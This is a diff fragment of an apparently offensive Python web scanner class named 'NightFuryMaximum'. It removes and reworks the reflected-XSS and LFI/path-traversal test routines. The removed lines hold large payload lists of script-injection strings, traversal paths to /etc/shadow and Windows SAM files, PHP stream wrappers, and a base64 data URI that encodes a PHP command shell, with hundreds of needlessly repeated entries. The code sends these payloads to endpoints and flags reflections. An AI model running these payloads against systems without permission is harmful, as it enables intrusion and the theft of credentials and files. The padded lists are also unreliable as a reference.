-            "<img src=x:alert(alt) alt=1>", "<form><button formaction=javascript:alert(1)>X", "<table background=\"javascript:alert(1)\">",
-            "<xss style=\"behavior:url(xss.htc);\">", "<object data=\"javascript:alert(1)\">", "<embed src=\"javascript:alert(1)\">",
-            "<var onmouseover=\"confirm(1)\">Test</var>", "<a onmouseover=\"confirm(1)\">Test</a>", "<input type=\"image\" src=\"\" onerror=\"confirm(1)\">",
-            "<isindex action=\"javascript:confirm(1)\" type=\"image\">", "<keygen autofocus onfocus=\"confirm(1)\">", "<video><source onerror=\"confirm(1)\">",
-            "<video src=\"\" onerror=\"confirm(1)\">", "<audio src=\"\" onerror=\"confirm(1)\">", "<track src=\"\" onerror=\"confirm(1)\">",
-            "<marquee onstart=\"confirm(1)\">", "<isindex type=image src=1 onerror=confirm(1)>", "<iframe/src=\"javascript:confirm(1)\">",
-            "<object data=\"javascript:confirm(1)\">", "<svg/onload=confirm(1)>", " <body onload=confirm(1)>", "<img src=x onerror=confirm(1)>",
-            " <script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>",
-            "<script>prompt(1)</script>", "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</prompt>",
-            "<script>confirm(1)</script>", "<script>alert(1)</script>", "<script>prompt(1)</script>", "<script>confirm(1)</script>",
-            "<script font='confirm(1)'>", "<style onload=confirm(1)>", "<link rel=import href='data:text/html,<script>confirm(1)</script>'>",
-            "<iframe/src=\"javascript:confirm(1)\">", "<embed src=\"javascript:confirm(1)\">", "<object data=\"javascript:confirm(1)\">"
         ]
         
+        test_tasks = []
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
-            
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
-                
-                for param in params:
-                    for payload in payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        result = self.request(test_url)
-                        if not result['success']:
-                            continue
-                        
-                        if payload in result['response']['text']:
-                            results.append({
-                                'type': 'Reflected XSS',
-                                'url': test_url,
-                                'param': param,
-                                'payload': payload
-                            })
-                            print(f"    {Fore.RED}⚠ Found: {param} XSS{Fore.RESET}")
-                            break
-            except:
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
+            for param in params:
+                for payload in payloads:
+                    test_params = params.copy()
+                    test_params[param] = [payload]
+                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
+                    test_tasks.append((test_url, param, payload))
+        
+        url_results = self._concurrent_request([t[0] for t in test_tasks])
+        for test_url, param, payload in test_tasks:
+            result = url_results.get(test_url)
+            if not result or not result['success']:
                 continue
+            if payload in result['response']['text']:
+                results.append({
+                    'type': 'Reflected XSS',
+                    'url': test_url,
+                    'param': param,
+                    'payload': payload
+                })
+                print(f"    {Fore.RED}⚠ Found: {param} XSS{Fore.RESET}")
+                break
         
         return results
     
@@ -1422,7 +1084,7 @@ class NightFuryMaximum:
         results = []
         print(f"  {Fore.BLUE}[8/14] Testing LFI/RFI/Path Traversal...{Fore.RESET}")
         
-        payloads = [
+        payloads = list(self._get_deep_payloads('lfi')) + [
             "../../../../etc/passwd",
             "..\\..\\..\\..\\windows\\win.ini",
             "../../../../etc/passwd%00",
@@ -1439,96 +1101,6 @@ class NightFuryMaximum:
             "/proc/self/environ",
             "file:///etc/passwd",
             "file:///c:/windows/win.ini",
-            # Additional 500+ Deep LFI Payloads
-            "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/motd", "/etc/issue", "/etc/bashrc", "/etc/profile",
-            "/proc/self/environ", "/proc/self/status", "/proc/self/cmdline", "/proc/self/mounts", "/proc/self/fd/0", "/proc/self/fd/1",
-            "/var/log/apache2/access.log", "/var/log/apache2/error.log", "/var/log/httpd/access_log", "/var/log/httpd/error_log",
-            "/var/log/nginx/access.log", "/var/log/nginx/error.log", "/var/log/auth.log", "/var/log/syslog",
-            "../../../../../../../../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../../../../../../../etc/shadow",
-            "../../../../../../../../../../../../../../../../etc/group",
-            "../../../../../../../../../../../../../../../../etc/hosts",
-            "../../../../../../../../../../../../../../../../etc/passwd%00",
-            "../../../../../../../../../../../../../../../../etc/passwd%00.jpg",
-            "../../../../../../../../../../../../../../../../etc/passwd\0",
-            "....//....//....//....//....//....//....//....//etc/passwd",
-            "....\\....\\....\\....\\....\\....\\....\\....\\etc/passwd",
-            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
-            "C:\\windows\\win.ini", "C:\\windows\\system.ini", "C:\\windows\\system32\\drivers\\etc\\hosts",
-            "C:\\boot.ini", "C:\\windows\\repair\\sam", "C:\\windows\\repair\\system",
-            "../../../../../../../../../../../../../../../../windows/win.ini",
-            "../../../../../../../../../../../../../../../../windows/system.ini",
-            "../../../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts",
-            "php://filter/convert.base64-encode/resource=index.php",
-            "php://filter/convert.base64-encode/resource=config.php",
-            "php://filter/convert.base64-encode/resource=wp-config.php",
-            "php://filter/convert.base64-encode/resource=../../../../../../../../../../../../../../../../etc/passwd",
-            "expect://ls", "php://input", "php://stdin", "php://stderr", "php://stdout", "php://fd/0",
-            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
